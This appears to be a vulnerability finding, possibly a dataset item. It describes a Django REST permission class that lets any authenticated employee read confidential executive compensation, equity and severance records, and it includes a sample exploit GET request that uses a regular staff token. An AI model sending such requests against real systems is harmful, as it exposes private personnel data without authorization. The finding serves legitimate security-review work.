diagnosis: ExecutiveCompensationViewSet applies a custom IsExecutiveOrReadOnly permission class that unconditionally returns True for all HTTP methods in permissions.SAFE_METHODS (GET, HEAD, OPTIONS). As a result, any authenticated employee can send GET requests to view confidential board-level compensation agreements, equity incentive grants, and severance packages of company executives.
exploit_request:
GET /api/governance/executive-compensation/4/ HTTP/1.1
Host: corporate.boardportal.com
Authorization: Bearer regular_staff_token
Accept: application/json
